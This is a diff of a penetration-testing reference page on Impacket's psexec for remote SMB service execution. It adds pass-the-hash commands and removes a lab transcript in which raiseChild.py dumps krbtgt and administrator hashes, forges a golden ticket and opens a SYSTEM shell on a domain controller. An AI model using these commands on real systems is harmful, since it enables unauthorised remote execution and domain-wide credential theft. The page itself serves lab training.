@@ -7,13 +7,23 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/psexec.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Verify remote service execution identity
+[Search this tool’s saved examples](/commands/notebook?tool=psexec) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+**Requires:** Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
+
+## Verify remote service execution identity
 
 **Run in:** Kali. **Requires:** A credential accepted by the target, SMB access and rights to write the administrative share and create a service.
 
@@ -21,63 +31,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-psexec 'DOMAIN/USER@TARGET_IP' whoami
 ```
 
-**Read the result:** The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.
-
-**If Authentication succeeds but service creation or output fails:** A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method.
+**What the result establishes:** The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.
 
 **Next check:** Check administrative-share and service-control access separately; record the returned identity before choosing any privileged action.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## psexec.py: choose the operation and read the result
-
-SMB service shell; requires service-control rights and a writable share, usually local administrator.
-
-### What the result establishes
-
-The returned identity belongs to a service-created process on the remote host; verify it with whoami before using local paths or privileges.
-
-### Prerequisites and common failures
-
-A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method.
-
-Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
-
-### Example 1: Password (prompted)
-
-Run in: **Kali**.
-
-```bash
-impacket-psexec 'DOMAIN/USER@TARGET_IP'
-```
-
-### Example 2: NT hash
-
-Run in: **Kali**.
-
-```bash
-impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
-```
-
-## Saved commands and notebook recipes
-
-SMB service shell; requires service-control rights and a writable share, usually local administrator.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=psexec) · [All tools](/index)
-
-**Requires:** Valid administrator credentials, SMB access, and writable admin shares/service creation rights on the Windows host.
 
 ## Password (prompted)
 
@@ -87,13 +43,6 @@ Replace UPPER_CASE values with your lab values.
 impacket-psexec 'DOMAIN/USER@TARGET_IP'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Impacket: Script Quick Reference — Example 1: Password (prompted)](/tools/impacket#example-1-password-prompted) · [psexec.py - SMB remote shell — Example 1: Password (prompted)](/tools/psexec#example-1-password-prompted)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 ## NT hash
 
 **Kali**
@@ -102,18 +51,15 @@ impacket-psexec 'DOMAIN/USER@TARGET_IP'
 impacket-psexec -hashes ':NT_HASH' 'DOMAIN/USER@TARGET_IP'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [Impacket: Script Quick Reference — Example 2: NT hash](/tools/impacket#example-2-nt-hash) · [psexec.py - SMB remote shell — Example 2: NT hash](/tools/psexec#example-2-nt-hash)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| Authentication succeeds but service creation or output fails | A valid login is insufficient: service creation, writable administrative shares, SMB connectivity and endpoint policy all affect this method. |
 
 ## Notebook recipes
 
-21 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -192,100 +138,6 @@ ACADEMY-EA-DC01
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Child to Parent Trusts - Linux — Getting a SYSTEM shell using Impacket's psexec.py](/active-directory/trusts-child-parent-linux#getting-a-system-shell-using-impackets-psexec-py)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Performing the Attack with raiseChild.py">
-
-### Performing the Attack with raiseChild.py
-
-**Child to Parent Trusts - Linux**
-
-```shellsession
-grcic550@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
-
-Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
-
-Password:
-[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
-[*] Forest FQDN is: INLANEFREIGHT.LOCAL
-[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
-[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
-[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
-LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
-LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
-[*] Getting credentials for INLANEFREIGHT.LOCAL
-INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
-INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
-[*] Target User account name is administrator
-INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
-INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
-[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Found writable share ADMIN$
-[*] Uploading file BnEGssCE.exe
-[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Starting service UVNb.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoami
-nt authority\system
-
-C:\Windows\system32>exit
-[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
-[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
-[*] Stopping service UVNb.....
-[*] Removing service UVNb.....
-[*] Removing file BnEGssCE.exe.....
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Child to Parent Trusts - Linux**
-
-```python
-#   The workflow is as follows:
-#       Input:
-#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
-#              The domain specified MUST be the domain FQDN.
-#           2) Optionally a pathname to save the generated golden ticket (-w switch)
-#           3) Optionally a target-user RID to get credentials (-targetRID switch)
-#              Administrator by default.
-#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
-#              Enterprise Admin by default.
-#
-#       Process:
-#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
-#           2) Find out what the forest FQDN is (via [MS-NRPC])
-#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
-#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
-#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
-#              and setting expiration 10 years from now
-#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
-#           7) If file was specified, save the golden ticket in ccache format
-#           8) If target was specified, a PSEXEC shell is launched
-#
-#       Output:
-#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
-#           2) A golden ticket saved in ccache for future fun and profit
-#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
-#              parameter.
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -420,7 +272,7 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+**Original note sections:** [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -601,21 +453,6 @@ sudo apt install impacket-scripts
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**psexec.py - SMB remote shell**
-
-Context from the notebook: impacket-psexec  is Kali's launcher for Impacket's  psexec.py . Microsoft's  PsExec.exe  is a separate Windows tool; its flags are different.
-
-```text
-PsExec.exe
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [psexec.py - SMB remote shell — Find or install the command](/tools/psexec#find-or-install-the-command)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Password, hash, or Kerberos">
@@ -661,49 +498,7 @@ psexec.py 'example.local/administrator@192.0.2.10'
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [psexec.py - SMB remote shell — Existing notes and worked examples](/tools/psexec#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Impacket: Script Quick Reference">
-
-### Impacket: Script Quick Reference
-
-**Impacket: Script Quick Reference**
-
-Context from the notebook: SMB remote shell psexec.py  /  impacket-psexec PsExec quickstart
-
-```text
-psexec.py
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples) · [psexec.py - SMB remote shell — Find or install the command](/tools/psexec#find-or-install-the-command) · [Windows remote execution by service — Choose a tool](/tools/windows-remote-execution#choose-a-tool)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Windows Remote Access">
-
-### Windows Remote Access
-
-**Ports, Protocols, and Services by Purpose**
-
-Context from the notebook: PsExec 445 Remote exec via SMB psexec.py &lt;user>:&lt;pass>@&lt;IP>
-
-```text
-psexec.py <user>:<pass>@<IP>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Windows Remote Access](/reference/master-protocol-service-quick-reference#windows-remote-access)
+**Original note sections:** [psexec.py - SMB remote shell — psexec.py - SMB remote shell](/tools/psexec)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -712,6 +507,10 @@ psexec.py <user>:<pass>@<IP>
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -719,5 +518,3 @@ psexec.py <user>:<pass>@<IP>
 - [psexec.py - SMB remote shell](/tools/psexec)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
